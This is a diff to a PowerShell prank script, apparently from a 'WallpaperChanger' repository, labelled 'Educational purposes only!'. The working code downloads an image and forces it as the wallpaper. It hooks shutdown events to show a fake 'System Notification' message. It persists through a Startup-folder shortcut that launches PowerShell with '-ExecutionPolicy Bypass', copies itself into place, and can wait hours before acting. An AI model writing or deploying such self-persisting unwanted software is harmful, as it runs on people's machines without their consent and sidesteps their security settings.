@@ -4,7 +4,7 @@ $scriptPath3 = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\noesu
 $batFilePath = "$env:userprofile\Downloads\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
-$startDelayEnabled = $true
+$startDelayEnabled = $false
 $delayHours = 3
 
 function Get-ScriptPath {
@@ -22,6 +22,7 @@ if ($null -eq $scriptPath) {
 }
 
 if ($startDelayEnabled -eq $true) {
+    Write-Host "Waiting for $delayHours hour(s)..."
     Start-Sleep -Seconds ($delayHours * 3600)
 }
 
@@ -30,7 +31,7 @@ $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonk
 
 if (-not (Test-Path $imagePath)) {
     Write-Host "Downloading image..."
-    
+
     try {
         Write-Host "Trying to download with curl..."
         Invoke-Expression "curl -o `"$imagePath`" `"$imageUrl`""
@@ -54,24 +55,25 @@ if (-not (Test-Path $imagePath)) {
     Write-Host "Image already exists. Setting as wallpaper."
 }
 
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-}
-"@
-[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)
-
-function Show-ImageMessage {
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
+try {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Wallpaper {
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    }
+    "@
+    [Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)
+    Write-Host "Wallpaper updated successfully."
+} catch {
+    Write-Host "Failed to update wallpaper: $_"
 }
 
 try {
     Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
-        Show-ImageMessage
+        Add-Type -AssemblyName PresentationFramework
+        [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
     }
 } catch {
     Write-Host "WMI not available in this environment."
@@ -85,10 +87,11 @@ if (-not (Test-Path $startupShortcutPath)) {
     $shortcut.TargetPath = "powershell.exe"
     $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
     $shortcut.Save()
+    Write-Host "Added to startup."
+}
 
-    if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
-        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
-    }
+if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
+    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1
 }
 
 # Educational purposes only!
